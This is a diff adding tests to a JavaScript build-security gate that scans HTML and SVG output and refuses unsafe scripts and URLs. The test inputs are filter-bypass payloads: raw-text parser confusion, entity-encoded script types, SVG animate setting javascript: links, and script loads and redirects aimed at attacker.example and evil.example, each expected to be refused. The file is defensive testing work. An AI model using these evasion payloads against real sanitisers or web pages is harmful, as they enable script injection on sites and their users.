@@ -181,6 +181,17 @@ test("documents are tokenised conservatively: comments, declarations, contexts, 
   assert.deepEqual(scan('<meta http-equiv="refresh" content="0; url=/site/x/" />').refreshes, ["/site/x/"]);
   assert.deepEqual(scan('<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1"/></svg>').scripts, []);
   assert.equal(scan('<?xml version="1.0"?><svg><script>x</script></svg>', { svg: true }).scripts.length, 1);
+  // Raw-text contexts and tag boundaries as the browser reads them: the executable script is the one found.
+  assert.deepEqual(scan('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>').scripts.map((s) => s.body), ["globalThis.pwned=1"]);
+  assert.deepEqual(scan('<style></stylex><script type="application/json"></style><script>globalThis.pwned=1</script>').scripts.map((s) => s.body), ["globalThis.pwned=1"]);
+  assert.deepEqual(scan('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="https://cdn.example.invalid/p.js"></script></svg>').scripts[0].attrs.get("xlink:href"), "https://cdn.example.invalid/p.js");
+  throwsGate(() => scan('<script! type="application/json"><script>globalThis.pwned=1</script>'), /unsupported tag name/);
+  throwsGate(() => scan('<svg xmlns:s="http://www.w3.org/2000/svg"><s:script>globalThis.pwned=1</s:script></svg>', { svg: true }), /qualified element name/);
+  throwsGate(() => scan('<?xml-stylesheet href="x.css"?><svg></svg>', { svg: true }), /processing instructions/);
+  throwsGate(() => scan('<?xmlversion="1.0"?><svg></svg>', { svg: true }), /processing instructions/);
+  for (const html of ['<svg><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>', "<svg><set attributeName=href to=x /></svg>", "<svg><animateTransform/></svg>"]) {
+    throwsGate(() => scan(html), /SVG animation element/, html);
+  }
   throwsGate(() => scan('<!-- <script src="/a.js"> --><script src="https://cdn.example.invalid/x.js"></script>'), /comment contains markup/);
   throwsGate(() => scan("<!-- a > b -->"), /comment contains markup/);
   throwsGate(() => scan("<!-- never closed"), /unterminated comment/);
@@ -245,12 +256,33 @@ test("HTML documents: known sources, pinned inline scripts, inert data blocks, b
     throwsGate(() => judge('<link rel="modulepreload" href="/site/assets/other.js">'), /preloads .* not a chunk/);
     assert.equal(judge('<link rel="modulepreload" href="/site/assets/index-abc.js"><script>' + INLINE + "</script>").inline, 1);
     assert.equal(judge('<meta http-equiv="refresh" content="0; url=/site/start/which-project/" /><script>' + INLINE + "</script>").inline, 1);
-    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/../other/">'), /not a dot-free path under/);
-    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/other/">'), /not a dot-free path under/);
+    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/../other/">'), /outside the base/);
+    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/other/">'), /outside the base/);
     throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=https://evil.example/">'), /outside this site/);
     throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=&#106;avascript:x">'), /outside this site|executable URL scheme/);
     assert.equal(judge("<script src='./assets/index-abc.js?v=1'></script><script src=embed.js></script>", { base: "/" }).inline, 0);
     assert.equal(judge('<script src="/assets/index-abc.js"></script>', { base: "/" }).documents, 1);
+    // URLs are read as the browser reads them: trimmed, tabs/newlines dropped, resolved against the document URL.
+    throwsGate(() => judge('<script src=" https://attacker.example/../../site/assets/index-abc.js"></script>'), /external script/);
+    throwsGate(() => judge('<script src="\\site\\assets\\index-abc.js"></script>'), /backslash/);
+    throwsGate(() => judge('<script src="/site/assets/index%2dabc.js"></script>'), /percent-encoded local path/);
+    assert.equal(judge('<script src="/site/assets/\tindex-abc.js"></script>').documents, 1);
+    throwsGate(() => judge('<meta http-equiv="refresh" content="0; url=/site/%2e%2e/other/">'), /outside the base/);
+    throwsGate(() => judge('<meta http-equiv="ref&#x72;esh" content="0; url=https://evil.example/">'), /outside this site/);
+    // Script types are read entity-decoded, and every JavaScript MIME type is executable.
+    throwsGate(() => judge('<script type="mod&#x75;le">import "https://attacker.example/p.js";</script>'), /inline script 1 is not pinned/);
+    throwsGate(() => judge('<script type="text/javascript1.5">globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
+    throwsGate(() => judge('<script language="javascript">globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
+    throwsGate(() => judge('<script type="application/x-javascript">globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
+    assert.equal(judge('<script type="text/template">{"dep":"react"}</script>').data, 1);
+    // Tokenizer states and SVG sources.
+    throwsGate(() => judge('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
+    throwsGate(() => judge('<style></stylex><script type="application/json"></style><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
+    throwsGate(() => judge('<script! type="application/json"><script>globalThis.pwned=1</script>'), /unsupported tag name/);
+    throwsGate(() => judge('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="https://attacker.example/p.js"></script></svg>'), /external script/);
+    throwsGate(() => judge('<svg><script href="https://attacker.example/p.js"></script></svg>'), /external script/);
+    throwsGate(() => judge('<script src="/site/embed.js" href="/site/embed.js"></script>'), /several source attributes/);
+    throwsGate(() => judge('<svg><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>'), /SVG animation element/);
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
@@ -314,6 +346,12 @@ test("every output file is a hash-checked chunk, a pinned tracked public script,
     throwsGate(() => check(), /inline event handler/);
     put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:x"></a></svg>');
     throwsGate(() => check(), /executable URL scheme/);
+    put("logo.svg", '<svg xmlns:s="http://www.w3.org/2000/svg"><s:script>globalThis.pwned=1</s:script></svg>');
+    throwsGate(() => check(), /qualified element name/);
+    put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>');
+    throwsGate(() => check(), /SVG animation element/);
+    put("logo.svg", '<?xml-stylesheet href="x.css"?><svg xmlns="http://www.w3.org/2000/svg"></svg>');
+    throwsGate(() => check(), /processing instructions/);
     put("logo.svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1"/></svg>');
     // Pinned public text that names the package by word still fails; non-word matches do not.
     const vendored = "// bundled copy of picomatch 4.0.7\n";
@@ -552,9 +590,15 @@ test("the deployment build's output must equal this build's chunks and pins (--v
     await refused(inHtml('<iframe srcdoc="&lt;script src=&quot;https://cdn.example.invalid/x.js&quot;&gt;&lt;/script&gt;"></iframe>'), /refused/);
     await refused(inHtml('<div onclick="fetch(1)"></div>'), /inline event handler/);
     await refused(inHtml('<a href="&#106;avascript:fetch(1)">x</a>'), /executable URL scheme/);
-    await refused(inHtml('<meta http-equiv="refresh" content="0; url=/../other/">'), /not a dot-free path/);
+    await refused(inHtml('<meta http-equiv="refresh" content="0; url=https://evil.example/">'), /outside this site/);
     await refused(inHtml('<link rel="modulepreload" href="https://cdn.example.invalid/x.js">'), /preloads an external script/);
     await refused(inHtml('<base href="https://cdn.example.invalid/">'), /<base> is refused/);
+    await refused(inHtml(`<script src=" https://attacker.example/../..${chunk.startsWith("/") ? "" : "/"}${chunk}"></script>`), /external script/);
+    await refused(inHtml('<script type="mod&#x75;le">import "https://attacker.example/p.js";</script>'), /inline script 2 is not pinned/);
+    await refused(inHtml('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /inline script 2 is not pinned/);
+    await refused(inHtml('<script! type="application/json"><script>globalThis.pwned=1</script>'), /unsupported tag name/);
+    await refused(inHtml('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="https://attacker.example/p.js"></script></svg>'), /external script/);
+    await refused(() => writeFileSync(join(dist, "evil.svg"), '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>'), /SVG animation element/);
     // An untracked file dropped into public/ reaches the judged build and is refused there too.
     writeFileSync(join(app, "public", "loose.js"), "console.log('loose')\n");
     await rejectsGate(run(argv(), []), /loose\.js is a script that is not a chunk of this build and not pinned/);
